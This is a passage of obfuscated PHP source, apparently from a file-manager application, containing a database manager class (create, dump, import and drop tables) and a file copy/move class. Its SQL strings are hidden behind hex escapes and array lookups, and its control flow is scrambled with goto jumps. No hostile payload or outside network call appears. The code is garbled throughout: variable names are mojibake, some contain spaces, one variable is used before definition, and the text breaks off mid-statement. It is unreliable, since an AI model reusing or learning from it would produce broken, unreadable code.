$f“•¯ÕÓ‰[980] . md5(serialize($eÉäÓ¨°¯)); $f¡¦½à˜í = think_cache($c¹ºó•…Å½); if ($f¡¦½à˜í) { return $f¡¦½à˜í; } } goto b…×Ôˆ‰´; f‡ÃµåÓí: } public function parseSql($Eˆ„¸Âõ½, $d—ëâÉ = array()) { $C¤¶ ¥åŞô =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eˆ„¸Âõ½ = str_replace(array($C¤¶ ¥åŞô[981], $C¤¶ ¥åŞô[982], $C¤¶ ¥åŞô[983], $C¤¶ ¥åŞô[984], $C¤¶ ¥åŞô[985], $C¤¶ ¥åŞô[986], $C¤¶ ¥åŞô[987], $C¤¶ ¥åŞô[988], $C¤¶ ¥åŞô[989], $C¤¶ ¥åŞô[990], $C¤¶ ¥åŞô[991]), array($this->parseTable("{$d—ëâÉ[$C¤¶ ¥åŞô[282]]}"), $this->parseDistinct(isset($d—ëâÉ[$C¤¶ ¥åŞô[992]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[992]] : !1), $this->parseField(!empty($d—ëâÉ[$C¤¶ ¥åŞô[276]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[276]] : $C¤¶ ¥åŞô[190]), $this->parseJoin(!empty($d—ëâÉ[$C¤¶ ¥åŞô[285]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[285]] : $C¤¶ ¥åŞô[33]), $this->parseWhere(!empty($d—ëâÉ[$C¤¶ ¥åŞô[278]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[278]] : $C¤¶ ¥åŞô[33]), $this->parseGroup(!empty($d—ëâÉ[$C¤¶ ¥åŞô[993]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[993]] : $C¤¶ ¥åŞô[33]), $this->parseHaving(!empty($d—ëâÉ[$C¤¶ ¥åŞô[994]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[994]] : $C¤¶ ¥åŞô[33]), $this->parseOrder(!empty($d—ëâÉ[$C¤¶ ¥åŞô[366]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[366]] : $C¤¶ ¥åŞô[33]), $this->parseLimit(!empty($d—ëâÉ[$C¤¶ ¥åŞô[295]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[295]] : $C¤¶ ¥åŞô[33]), $this->parseUnion(!empty($d—ëâÉ[$C¤¶ ¥åŞô[350]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[350]] : $C¤¶ ¥åŞô[33]), $this->parseComment(!empty($d—ëâÉ[$C¤¶ ¥åŞô[357]]) ? $d—ëâÉ[$C¤¶ ¥åŞô[357]] : $C¤¶ ¥åŞô[33])), $Eˆ„¸Âõ½); return $Eˆ„¸Âõ½; } public function getLastSql($d‚İóçÕ’£ = '') { return $d‚İóçÕ’£ ? $this->modelSql[$d‚İóçÕ’£] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($dÂëİ¿Ö) { return addslashes($dÂëİ¿Ö); } public function setModel($AÛå°Åà®š) { $this->model = $AÛå°Åà®š; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($E‹©öñªÑ, $E‰‡¤È¸ ± = '') { $this->database = $E‹©öñªÑ; $this->type = $E‰‡¤È¸ ±; } public function model($EÃ„ˆ‹±ËÛ = '') { return new ModelBase($EÃ„ˆ‹±ËÛ, $_SERVER[åÌÛ»ô¢‚ö™][33], $this->database); } public function db($b¤é‘¯ã®Ç = false) { goto A¬¯‚î“ëõ; A¬¯‚î“ëõ: $d ¢—âÅÖ© =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÎõÄ×Åàø = array_change_key_case($this->database); if ($this->type == $d ¢—âÅÖ©[9] || !$b¤é‘¯ã®Ç) { return $this->model()->db(); } goto fˆÆ®ø†¢; fÃ¯Ç¥ö²Õ: $this->database = $dÎõÄ×Åàø; $fÀùõ˜•ìÓ->execute("\165\x73\x65\x20\140{$a—ŸÅë˜Áà}\x60"); return $fÀùõ˜•ìÓ; goto AêÔìÀ¡ë; FÑ³„”ìçÙ: $this->database = $dÎõÄ×Åàø; $fÀùõ˜•ìÓ = $this->model()->db(); try { $DÅ¼²¶Ôß  = $fÀùõ˜•ìÓ->execute("\x73\150\157\167\x20\144\141\x74\x61\x62\x61\x73\x65\x73\40\154\151\x6b\145\40\x27{$a—ŸÅë˜Áà}\47"); } catch (Exception $B„Úò‰Á©Î) { } goto A‰‡ÛÌ·ãŸ; fˆÆ®ø†¢: $a—ŸÅë˜Áà = $dÎõÄ×Åàø[$d ¢—âÅÖ©[907]]; $dÎõÄ×Åàø[$d ¢—âÅÖ©[907]] = $d ¢—âÅÖ©[33]; if ($dÎõÄ×Åàø[$d ¢—âÅÖ©[749]] == $d ¢—âÅÖ©[750]) { $eÓÑÎµ«æË = $dÎõÄ×Åàø[$d ¢—âÅÖ©[751]]; $dÎõÄ×Åàø[$d ¢—âÅÖ©[751]] = substr($eÓÑÎµ«æË, 0, strrpos($eÓÑÎµ«æË, $d ¢—âÅÖ©[995])); } goto FÑ³„”ìçÙ; A‰‡ÛÌ·ãŸ: if (!$DÅ¼²¶Ôß ) { $fÀùõ˜•ìÓ->execute("\143\x72\145\x61\x74\x65\x20\x64\x61\164\141\142\x61\x73\x65\40\x60{$a—ŸÅë˜Áà}\x60"); } $dÎõÄ×Åàø[$d ¢—âÅÖ©[907]] = $a—ŸÅë˜Áà; if ($dÎõÄ×Åàø[$d ¢—âÅÖ©[749]] == $d ¢—âÅÖ©[750]) { $dÎõÄ×Åàø[$d ¢—âÅÖ©[751]] .= $d ¢—âÅÖ©[995] . $a—ŸÅë˜Áà; } goto fÃ¯Ç¥ö²Õ; AêÔìÀ¡ë: } public function createTable($D¿¹È–ï‹Á, $c¤‡ÄÒÆå› = null) { $F‡ˆ÷ŞÙİƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!IO::exist($D¿¹È–ï‹Á)) { ActionCall($F‡ˆ÷ŞÙİƒ[996], !0, 0); show_json(LNG($F‡ˆ÷ŞÙİƒ[997]), !1); } $A¥ŠÔ™±‡Œ = sqlSplit(IO::getContent($D¿¹È–ï‹Á)); foreach ($A¥ŠÔ™±‡Œ as $B–áğ³Ú) { if ($c¤‡ÄÒÆå›) { $eêÊÍ–òŒŞ = stripos($B–áğ³Ú, $F‡ˆ÷ŞÙİƒ[998]) === 0; if ($eêÊÍ–òŒŞ) { $c¤‡ÄÒÆå›->task[$F‡ˆ÷ŞÙİƒ[999]] += 1; } } $this->model()->db()->execute($B–áğ³Ú); if ($c¤‡ÄÒÆå› && $eêÊÍ–òŒŞ) { preg_match($F‡ˆ÷ŞÙİƒ[1000], $B–áğ³Ú, $dÏ•Òìºäó); $c¤‡ÄÒÆå›->task[$F‡ˆ÷ŞÙİƒ[1001]] = $dÏ•Òìºäó[1]; $c¤‡ÄÒÆå›->update(1); } } $this->taskToCache($c¤‡ÄÒÆå›); } public function insertTable($B½¸ÆñÒ‹, $EÚªãµ¦° = null) { $C®¨±‰›çº =& $_SERVER[åÌÛ»ô¢‚ö™]; $D…çèáéÒ† = $this->model()->db(); $d¥‚ çà = $cË¾‘Ã±¼¼ ? array($cË¾‘Ã±¼¼) : $D…çèáéÒ†->getTables(); foreach ($B½¸ÆñÒ‹ as $D¸¡ô¨â¡‰) { $cË¾‘Ã±¼¼ = basename($D¸¡ô¨â¡‰, $C®¨±‰›çº[744]); if (!in_array($cË¾‘Ã±¼¼, $d¥‚ çà)) { continue; } if ($EÚªãµ¦°) { $EÚªãµ¦°->task[$C®¨±‰›çº[1001]] = $cË¾‘Ã±¼¼; } if (get_filesize($D¸¡ô¨â¡‰) == 0) { continue; } $DŒöÎˆ½×Ó = $this->sqlToDb($D¸¡ô¨â¡‰, $EÚªãµ¦°); if (!$DŒöÎˆ½×Ó) { ActionCall($C®¨±‰›çº[996], !0, 0); show_json(LNG($C®¨±‰›çº[1002]) . "\x5b{$cË¾‘Ã±¼¼}\135", !1); } } $this->taskToCache($EÚªãµ¦°); } public function sqlFromDb($c²îõ‰Ïƒ‹, $c±ˆ¶ºÃ÷¯, $cÌ‰ÅÆÇ¯¬ = null, $AÅ¾˜¢ÛêÀ = null) { goto AĞ·£ê‰£Ì; cÎæèª¾ó: fclose($d¸öÖ´‘¿); return $a¨½ËÛáÏ´; goto aÚò´™ÓÅä; AĞ·£ê‰£Ì: if ($cÌ‰ÅÆÇ¯¬) { $cÌ‰ÅÆÇ¯¬->task[$_SERVER[åÌÛ»ô¢‚ö™][1001]] = $c²îõ‰Ïƒ‹; } $eíîÕÓ–»ï = $this->model($c²îõ‰Ïƒ‹); $a¨½ËÛáÏ´ = 0; goto fÃ˜İÉ’; fÃ˜İÉ’: $eĞÏæÒ = 1; $Fˆçà—à˜¦ = 500; $d¸öÖ´‘¿ = fopen($c±ˆ¶ºÃ÷¯, $_SERVER[åÌÛ»ô¢‚ö™][1003]); goto EèÈÏÑ¾â·; EèÈÏÑ¾â·: $fù¸ë¶²é = $eíîÕÓ–»ï->getPk(); $a¦—×Ğ¦éÎ = $eíîÕÓ–»ï->getDbFields(); do { $Cï„©Ó‹—› = $eíîÕÓ–»ï->field($a¦—×Ğ¦éÎ)->order($fù¸ë¶²é . $_SERVER[åÌÛ»ô¢‚ö™][1004])->selectPage($Fˆçà—à˜¦, $eĞÏæÒ); $a­ø—ˆÈĞ = isset($Cï„©Ó‹—›[$_SERVER[åÌÛ»ô¢‚ö™][367]][$_SERVER[åÌÛ»ô¢‚ö™][369]]) ? $Cï„©Ó‹—›[$_SERVER[åÌÛ»ô¢‚ö™][367]][$_SERVER[åÌÛ»ô¢‚ö™][369]] : 0; $cõ¬«ÀõÃ¸ = !empty($Cï„©Ó‹—›[$_SERVER[åÌÛ»ô¢‚ö™][370]]) ? $Cï„©Ó‹—›[$_SERVER[åÌÛ»ô¢‚ö™][370]] : array(); if (!($d¸‡îö • = count($cõ¬«ÀõÃ¸))) { break; } $e†¹Çó®·Æ = array(); foreach ($cõ¬«ÀõÃ¸ as $DÆ¢ÍƒÅ‹¶) { if ($c²îõ‰Ïƒ‹ == $_SERVER[åÌÛ»ô¢‚ö™][1005] && $DÆ¢ÍƒÅ‹¶[$_SERVER[åÌÛ»ô¢‚ö™][29]] == $_SERVER[åÌÛ»ô¢‚ö™][1006]) { $Fâà¾¹¾ÓŒ = json_decode($DÆ¢ÍƒÅ‹¶[$_SERVER[åÌÛ»ô¢‚ö™][375]], !0); if ($Fâà¾¹¾ÓŒ[$_SERVER[åÌÛ»ô¢‚ö™][28]] == date($_SERVER[åÌÛ»ô¢‚ö™][717]) && !$Fâà¾¹¾ÓŒ[$_SERVER[åÌÛ»ô¢‚ö™][716]]) { continue; } } if ($AÅ¾˜¢ÛêÀ) { $DÆ¢ÍƒÅ‹¶[$_SERVER[åÌÛ»ô¢‚ö™][75]] = "\x7b\151\x6f\72{$AÅ¾˜¢ÛêÀ}\x7d" . substr($DÆ¢ÍƒÅ‹¶[$_SERVER[åÌÛ»ô¢‚ö™][75]], strlen("\173\x69\x6f\72{$DÆ¢ÍƒÅ‹¶[$_SERVER[åÌÛ»ô¢‚ö™][770]]}\175")); $DÆ¢ÍƒÅ‹¶[$_SERVER[åÌÛ»ô¢‚ö™][770]] = $AÅ¾˜¢ÛêÀ; } $e†¹Çó®·Æ[] = $_SERVER[åÌÛ»ô¢‚ö™][1007] . $this->sqlEncode($DÆ¢ÍƒÅ‹¶) . $_SERVER[åÌÛ»ô¢‚ö™][1008]; } $fÂš¡ÛÏå™ = "\x49\116\123\x45\122\x54\x20\x49\116\124\x4f\x20\140{$c²îõ‰Ïƒ‹}\140\x20\50\x60" . implode($_SERVER[åÌÛ»ô¢‚ö™][1009], $a¦—×Ğ¦éÎ) . $_SERVER[åÌÛ»ô¢‚ö™][1010]; fwrite($d¸öÖ´‘¿, $fÂš¡ÛÏå™ . implode($_SERVER[åÌÛ»ô¢‚ö™][1011], $e†¹Çó®·Æ) . $_SERVER[åÌÛ»ô¢‚ö™][67] . PHP_EOL); $eĞÏæÒ++; $a¨½ËÛáÏ´ += $d¸‡îö •; if ($cÌ‰ÅÆÇ¯¬) { $cÌ‰ÅÆÇ¯¬->update($d¸‡îö •); } } while ($eĞÏæÒ <= $a­ø—ˆÈĞ); goto cÎæèª¾ó; aÚò´™ÓÅä: } public function sqlToDb($c¤—§œğø, $B­±åöÑë­ = null) { goto CßÒßÓÁšî; CßÒßÓÁšî: $A•í·±‡ĞŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a¸ç’„„«‡ = $this->model()->db(); $bµ‘“ÊŠ²¦ = @fopen($c¤—§œğø, $A•í·±‡ĞŠ[1012]); goto då´×Š·Êé; då´×Š·Êé: if (!$bµ‘“ÊŠ²¦) { return !1; } $câƒ“ÚÇÄ¶ = 0; $EŞˆš¢óË = $A•í·±‡ĞŠ[33]; goto e »Ÿ©‘¨; CÙ’é˜ã: if (trim($EŞˆš¢óË)) { $EŞˆš¢óË = rtrim(trim($EŞˆš¢óË), $A•í·±‡ĞŠ[67]); if (!$a¸ç’„„«‡->execute($EŞˆš¢óË)) { return !1; } if ($B­±åöÑë­) { $B­±åöÑë­->update($câƒ“ÚÇÄ¶ - 1); } } return !0; goto C…®©çĞÒ; e »Ÿ©‘¨: $BŞ¬¢¡œ = 500 + 1; while (!feof($bµ‘“ÊŠ²¦)) { if ($B­±åöÑë­ && $câƒ“ÚÇÄ¶ != 0) { $B­±åöÑë­->task[$A•í·±‡ĞŠ[999]] += 1; } $câƒ“ÚÇÄ¶++; $C÷÷Íè–µ˜ = trim(fgets($bµ‘“ÊŠ²¦)); $EŞˆš¢óË .= $A•í·±‡ĞŠ[50] . $this->sqlDecode($C÷÷Íè–µ˜, $this->type); if ($câƒ“ÚÇÄ¶ == $BŞ¬¢¡œ) { $EŞˆš¢óË = rtrim(trim($EŞˆš¢óË), $A•í·±‡ĞŠ[67]); if (!$a¸ç’„„«‡->execute($EŞˆš¢óË)) { return !1; } if ($B­±åöÑë­) { $B­±åöÑë­->update($câƒ“ÚÇÄ¶ - 1); } $EŞˆš¢óË = $A•í·±‡ĞŠ[33]; $câƒ“ÚÇÄ¶ = 0; } } fclose($bµ‘“ÊŠ²¦); goto CÙ’é˜ã; C…®©çĞÒ: } public function dropTable($bíîöÃŸ®¨ = null) { $cÑÕÄÏ™İù = $this->model()->db(); $A‚ ëÑ…ÃÜ = $bíîöÃŸ®¨ ? array($bíîöÃŸ®¨) : $cÑÕÄÏ™İù->getTables(); if (!$A‚ ëÑ…ÃÜ) { return; } foreach ($A‚ ëÑ…ÃÜ as $bíîöÃŸ®¨) { $cÑÕÄÏ™İù->execute("\x64\162\157\x70\x20\164\141\142\x6c\x65\x20\x69\x66\x20\145\170\151\x73\164\163\x20\140{$bíîöÃŸ®¨}\140"); } } private function taskToCache($c¾‚Ø†¡² = null) { $a±©ÑÜ¤Š =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$c¾‚Ø†¡²) { return; } $d‹ÕÊ†ç = array($a±©ÑÜ¤Š[1001] => $c¾‚Ø†¡²->task[$a±©ÑÜ¤Š[1001]], $a±©ÑÜ¤Š[999] => $c¾‚Ø†¡²->task[$a±©ÑÜ¤Š[999]], $a±©ÑÜ¤Š[1013] => $c¾‚Ø†¡²->task[$a±©ÑÜ¤Š[1013]]); if ($d‹ÕÊ†ç[$a±©ÑÜ¤Š[999]] == $d‹ÕÊ†ç[$a±©ÑÜ¤Š[1013]]) { $d‹ÕÊ†ç[$a±©ÑÜ¤Š[723]] = 1; } Cache::set($a±©ÑÜ¤Š[1014] . $c¾‚Ø†¡²->task[$a±©ÑÜ¤Š[392]], $d‹ÕÊ†ç); $c¾‚Ø†¡²->end(); } private function sqlEncode($CÅÄĞ¨»ä) { $eîß‰„‹ÍÀ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aö³ßä›‡½ = array(); foreach ($CÅÄĞ¨»ä as $E«–ôÒŒ ) { if (is_array($E«–ôÒŒ )) { $E«–ôÒŒ  = json_encode_force($E«–ôÒŒ ); } $E«–ôÒŒ  = addslashes($E«–ôÒŒ ); $E«–ôÒŒ  = str_replace(array($eîß‰„‹ÍÀ[1015], $eîß‰„‹ÍÀ[183]), array($eîß‰„‹ÍÀ[1016], $eîß‰„‹ÍÀ[1017]), $E«–ôÒŒ ); $aö³ßä›‡½[] = str_replace($eîß‰„‹ÍÀ[55], $eîß‰„‹ÍÀ[1018], $E«–ôÒŒ ); } return $eîß‰„‹ÍÀ[55] . implode($eîß‰„‹ÍÀ[1019], $aö³ßä›‡½) . $eîß‰„‹ÍÀ[55]; } private function sqlDecode($BØ¢Æ‚µ¤, $A£ùƒğ±íô) { $D”Ë¬ÄÚâ‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BØ¢Æ‚µ¤ = str_replace(array($D”Ë¬ÄÚâ‘[1016], $D”Ë¬ÄÚâ‘[1017]), array($D”Ë¬ÄÚâ‘[1015], $D”Ë¬ÄÚâ‘[183]), $BØ¢Æ‚µ¤); if ($A£ùƒğ±íô == $D”Ë¬ÄÚâ‘[9]) { $BØ¢Æ‚µ¤ = stripslashes($BØ¢Æ‚µ¤); } return $BØ¢Æ‚µ¤; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f´»í®åˆ¶, $a³¶ææÀÜ) { $BĞ²ÛÊäÅÂ = self::driverMake($a³¶ææÀÜ[0]); if (method_exists($BĞ²ÛÊäÅÂ, $f´»í®åˆ¶)) { return @call_user_func_array(array($BĞ²ÛÊäÅÂ, $f´»í®åˆ¶), $a³¶ææÀÜ); } if (method_exists($BĞ²ÛÊäÅÂ, $_SERVER[åÌÛ»ô¢‚ö™][1020])) { return @call_user_func_array(array($BĞ²ÛÊäÅÂ, $f´»í®åˆ¶), $a³¶ææÀÜ); } else { if (method_exists(self, $f´»í®åˆ¶)) { return @call_user_func_array(array(self, $f´»í®åˆ¶), $a³¶ææÀÜ); } else { call_user_func_array(array(parent, $f´»í®åˆ¶), $a³¶ææÀÜ); } } } public static function init($b¤­• ¥˜) { return self::driverMake($b¤­• ¥˜); } public static function copy($cì†øÕ…®ç, $b—åÆˆ—Å , $e™ƒÛñì™é = false, $bğÇŠÉ›± = false) { return self::copyMove($cì†øÕ…®ç, $b—åÆˆ—Å , $e™ƒÛñì™é, $_SERVER[åÌÛ»ô¢‚ö™][516], $bğÇŠÉ›±); } public static function move($aößó¯ÁØ, $e›¬„ÜÅ¤¼, $cƒŸ…Š³†Ö = false, $F¥ëßÏâ‹Ñ = false) { return self::copyMove($aößó¯ÁØ, $e›¬„ÜÅ¤¼, $cƒŸ…Š³†Ö, $_SERVER[åÌÛ»ô¢‚ö™][518], $F¥ëßÏâ‹Ñ); } public static function saveFile($Eµå‰º¬™ç, $EºÇÅÆ“, $A¦°å”©© = true) { goto e‡×³«½¿; a—†¬ÀÖˆ©: $bå¯µÂ¥é = self::driverMake($EºÇÅÆ“); $CƒÌŸøŠÈ° = !1; if ($bå¯µÂ¥é->pathParse[$aƒ‚©…ÉŒƒ[1021]]) { $DëîòõäÍ™ = $bå¯µÂ¥é->pathParse[$aƒ‚©…ÉŒƒ[1021]]; $CƒÌŸøŠÈ° = $bå¯µÂ¥é; $bå¯µÂ¥é = self::driverMake($DëîòõäÍ™); } goto fÒù†™šµ•; fÒù†™šµ•: $Eõî¢ñ«ù = $bå¯µÂ¥é->pathFather($EºÇÅÆ“); $EëŞ¯µ‹ƒÉ = !0; if (!$A¦°å”©© && self::driverIsSame($dà ¯î±›, $bå¯µÂ¥é)) { $EëŞ¯µ‹ƒÉ = !1; } goto fÏŞ½™Å¾ˆ; e‡×³«½¿: $aƒ‚©…ÉŒƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aôÚíóÅŠ = self::info($EºÇÅÆ“); $dà ¯î±› = self::driverMake($Eµå‰º¬™ç); goto a—†¬ÀÖˆ©; fÏŞ½™Å¾ˆ: $fáƒÚ¨™Ä† = self::copyFile($dà ¯î±›, $Eµå‰º¬™ç, $bå¯µÂ¥é, $Eõî¢ñ«ù, $aôÚíóÅŠ[$aƒ‚©…ÉŒƒ[28]], $EëŞ¯µ‹ƒÉ); if ($CƒÌŸøŠÈ°) { $fáƒÚ¨™Ä† = $CƒÌŸøŠÈ°->getPathOuter($fáƒÚ¨™Ä†); } return $fáƒÚ¨™Ä†; goto d¸™‚ÊÙîŞ; d¸™‚ÊÙîŞ: } private static function copyMove($AòĞ‹ØÇ§Õ, $CÜÚ¶‘¹‚”, $BÇÙÑ×´ÜÌ, $Fã‰ºŠ˜ã, $A„¶œø°á = false) { goto f†ÇÜö‰±Ô; fÉŠªŒàÖ: $bË«Ä‰î”ì = !1; if ($Dí·‹ŞÄ¡->pathParse[$e„ÆÙŒÈ[1021]]) { $CÜÚ¶‘¹‚” = $Dí·‹ŞÄ¡->pathParse[$e„ÆÙŒÈ[1021]]; $bË«Ä‰î”ì = $Dí·‹ŞÄ¡; $Dí·‹ŞÄ¡ = self::driverMake($CÜÚ¶‘¹‚”); } self::check($Fù¶æïÁçÔ, $AòĞ‹ØÇ§Õ, $Dí·‹ŞÄ¡, $CÜÚ¶‘¹‚”); goto dßöÖÉùÆÓ; C‡ÕÑ“‘: if ($bË«Ä‰î”ì) { $EÙ“Õø¹÷¸ = $bË«Ä‰î”ì->getPathOuter($EÙ“Õø¹÷¸); } return $EÙ“Õø¹÷¸; goto e–Ì´–‹ÌŒ; a–Û§•²…Ç: $Fù¶æïÁçÔ = self::driverMake($AòĞ‹ØÇ§Õ); $Dí·‹ŞÄ¡ = self::driverMake($CÜÚ¶‘¹‚”); $eøÍÄÍ—‹£ = $Fã‰ºŠ˜ã == $e„ÆÙŒÈ[518]; goto fÉŠªŒàÖ; B‰’¥óÍƒ: $Fñ×“ºç¯ = $Fù¶æïÁçÔ->isFile($AòĞ‹ØÇ§Õ); if (!$Fñ×“ºç¯ && $Dí·‹ŞÄ¡->getType() == $e„ÆÙŒÈ[721] && $Fù¶æïÁçÔ->getType() == $e„ÆÙŒÈ[102]) { $EÙ“Õø¹÷¸ = $Dí·‹ŞÄ¡->copyFolderFromIO($Fù¶æïÁçÔ, $AòĞ‹ØÇ§Õ, $CÜÚ¶‘¹‚”, $BÇÙÑ×´ÜÌ, $eøÍÄÍ—‹£, $A„¶œø°á); } else { $EÙ“Õø¹÷¸ = self::copyPath($Fù¶æïÁçÔ, $AòĞ‹ØÇ§Õ, $Dí·‹ŞÄ¡, $CÜÚ¶‘¹‚”, $BÇÙÑ×´ÜÌ, $eøÍÄÍ—‹£, $Fñ×“ºç¯, $A„¶œø°á); } if ($EÙ“Õø¹÷¸ && $eøÍÄÍ—‹£) { $Fù¶æïÁçÔ->remove($AòĞ‹ØÇ§Õ); } goto C‡ÕÑ“‘; f†ÇÜö‰±Ô: $e„ÆÙŒÈ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$AòĞ‹ØÇ§Õ || $AòĞ‹ØÇ§Õ == $e„ÆÙŒÈ[8] || !$CÜÚ¶‘¹‚”) { return !1; } ignore_timeout(); goto a–Û§•²…Ç; dßöÖÉùÆÓ: Hook::trigger($e„ÆÙŒÈ[72], $Fù¶æïÁçÔ, $AòĞ‹ØÇ§Õ, $Dí·‹ŞÄ¡, $CÜÚ¶‘¹‚”); $A²öØ†˜ÑÀ = self::driverIsSame($Fù¶æïÁçÔ, $Dí·‹ŞÄ¡); if ($A²öØ†˜ÑÀ) { if ($Fã‰ºŠ˜ã == $e„ÆÙŒÈ[518] && !method_exists($Dí·‹ŞÄ¡, $e„ÆÙŒÈ[1022]) && trim($CÜÚ¶‘¹‚”, $e„ÆÙŒÈ[8]) == trim($Dí·‹ŞÄ¡->pathFather($AòĞ‹ØÇ§Õ), $e„ÆÙŒÈ[8])) { return $Dí·‹ŞÄ¡->getPathOuter($AòĞ‹ØÇ§Õ); } if (method_exists($Dí·‹ŞÄ¡, $Fã‰ºŠ˜ã)) { return $Dí·‹ŞÄ¡->{$Fã‰ºŠ˜ã}($AòĞ‹ØÇ§Õ, $CÜÚ¶‘¹‚”, $BÇÙÑ×´ÜÌ); } } goto B‰’¥óÍƒ; e–Ì´–‹ÌŒ: } private static function check($Cêæ‹½š, $fõ¹Ú¤É«, $f•«éİË¨È, &$A‡ƒ¿§‡¤¥) { $a›„¢§’ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (self::driverIsSame($Cêæ‹½š, $f•«éİË¨È) && $Cêæ‹½š->isFolder($fõ¹Ú¤É«) && $Cêæ‹½š->isParentOf($fõ¹Ú¤É«, $A‡ƒ¿§‡¤¥)) { show_json(LNG($a›„¢§’[1023]), !1); } if (!$Cêæ‹½š->exist($fõ¹Ú¤É«)) { show_json(LNG($a›„¢§’[101]), !1); } } private static function copyPath($CŒçéËÙ¬, $DÊ—±ëğì, $Fí‰Ÿ”¹¹¾, $DÙñ´ªâ´ù, $AŒçØªÕŞ¹, $DË÷Ş¤ƒÊ, $Bš³œ‚âÑ, $AŒÕË²ˆ = false) { goto d‚Å¦›‘à°; Fİ›æ‚Ö½: $BÑóÁ‡›¥Û = $Fí‰Ÿ”¹¹¾->mkdir($Fí‰Ÿ”¹¹¾->getPath($B·Şè‰¥»³)); $DÙñ´ªâ´ù = $Fí‰Ÿ”¹¹¾->getPathInner($BÑóÁ‡›¥Û); $FÍ„‚‹‘¾â = $CŒçéËÙ¬->listPath($DÊ—±ëğì, !0); goto e‡Î‹ºìãÉ; d‚Å¦›‘à°: $E˜«çÏ›Á =& $_SERVER[åÌÛ»ô¢‚ö™]; $F˜î½ø‘¯’ = $AŒÕË²ˆ ? $AŒÕË²ˆ : $CŒçéËÙ¬->getPathName($CŒçéËÙ¬->pathThis($DÊ—±ëğì)); if ($AŒçØªÕŞ¹) { $F½­†ÏÙ¿ = $Fí‰Ÿ”¹¹¾->fileNameExist($DÙñ´ªâ´ù, $F˜î½ø‘¯’); $F˜î½ø‘¯’ = $Fí‰Ÿ”¹¹¾->fileNameAuto($DÙñ´ªâ´ù, $F˜î½ø‘¯’, $AŒçØªÕŞ¹, !$Bš³œ‚âÑ); $AŒçØªÕŞ¹ = $F½­†ÏÙ¿ ? $AŒçØªÕŞ¹ : !1; } goto Eí³¶®¢“; e‡Î‹ºìãÉ: $bê”´–ÃºŠ = array_merge($FÍ„‚‹‘¾â[$E˜«çÏ›Á[73]], $FÍ„‚‹‘¾â[$E˜«çÏ›Á[74]]); foreach ($bê”´–ÃºŠ as $FÍŠñôÑôÍ) { $Cø°“÷Ö = $FÍŠñôÑôÍ[$E˜«çÏ›Á[29]] == $E˜«çÏ›Á[171]; $DÊ—±ëğì = $CŒçéËÙ¬->getPathInner($FÍŠñôÑôÍ[$E˜«çÏ›Á[75]]); $A‡ÈÈò¯ğ„ = self::copyPath($CŒçéËÙ¬, $DÊ—±ëğì, $Fí‰Ÿ”¹¹¾, $DÙñ´ªâ´ù, $AŒçØªÕŞ¹, $DË÷Ş¤ƒÊ, $Cø°“÷Ö); if (!$A‡ÈÈò¯ğ„) { write_log($E˜«çÏ›Á[1024] . $DÊ—±ëğì . $E˜«çÏ›Á[1025] . $DÙñ´ªâ´ù, $E˜«çÏ›Á[1026]); } } return $BÑóÁ‡›¥Û; goto dÄƒå°Ä²; Eí³¶®¢“: if ($Bš³œ‚âÑ) { return self::copyFile($CŒçéËÙ¬, $DÊ—±ëğì, $Fí‰Ÿ”¹¹¾, $DÙñ´ªâ´ù, $F˜î½ø‘¯’, $DË÷Ş¤ƒÊ); } if ($AŒçØªÕŞ¹ == REPEAT_RENAME_FOLDER) { $AŒçØªÕŞ¹ = !1; } $B·Şè‰¥»³ = rtrim($DÙñ´ªâ´ù, $E˜«çÏ›Á[8]) . $E˜«çÏ›Á[8] . $F˜î½ø‘¯’; goto Fİ›æ‚Ö½; dÄƒå°Ä²: } private static function copyFile($dàÙ¼‹Ó¾, $d”íÆŒÀ—¡, $B†¨ÓÑöáÏ, $BĞ›Ş³—˜Á, $fÚ’¬÷µ, $b¦Ÿ á‚Ü‡) { goto A‹£­‡ŠĞ–; eÈ²©ñ™ÚÒ: Hook::trigger($FºÁÜ²ÑÚù[1029], $dàÙ¼‹Ó¾, $d”íÆŒÀ—¡, $B†¨ÓÑöáÏ, $BĞ›Ş³—˜Á, $fÚ’¬÷µ, $D¼‡ÀùœÁ—); return $D¼‡ÀùœÁ—; goto Aª±‚èŠË¨; Fõ»Âö¹•: Hook::trigger($FºÁÜ²ÑÚù[1028], $dàÙ¼‹Ó¾, $d”íÆŒÀ—¡, $B†¨ÓÑöáÏ, $BĞ›Ş³—˜Á, $fÚ’¬÷µ, $bƒŠêŒö¯); if (self::driverIsSame($dàÙ¼‹Ó¾, $B†¨ÓÑöáÏ)) { if ($b¦Ÿ á‚Ü‡) { $D¼‡ÀùœÁ— = $B†¨ÓÑöáÏ->moveFile($d”íÆŒÀ—¡, $BĞ›Ş³—˜Á); } else { $D¼‡ÀùœÁ— = $B†¨ÓÑöáÏ->copyFile($d”íÆŒÀ—¡, $BĞ›Ş³—˜Á); } Hook::trigger($FºÁÜ²ÑÚù[1029], $dàÙ¼‹Ó¾, $d”íÆŒÀ—¡, $B†¨ÓÑöáÏ, $BĞ›Ş³—˜Á, $fÚ’¬÷µ, $D¼‡ÀùœÁ—); return $D¼‡ÀùœÁ—; } $aàÇ–óŠ§¤ = TEMP_FILES; goto DÛà’ß÷¿Ÿ; A‹£­‡ŠĞ–: $FºÁÜ²ÑÚù =& $_SERVER[åÌÛ»ô¢‚ö™]; $BĞ›Ş³—˜Á = 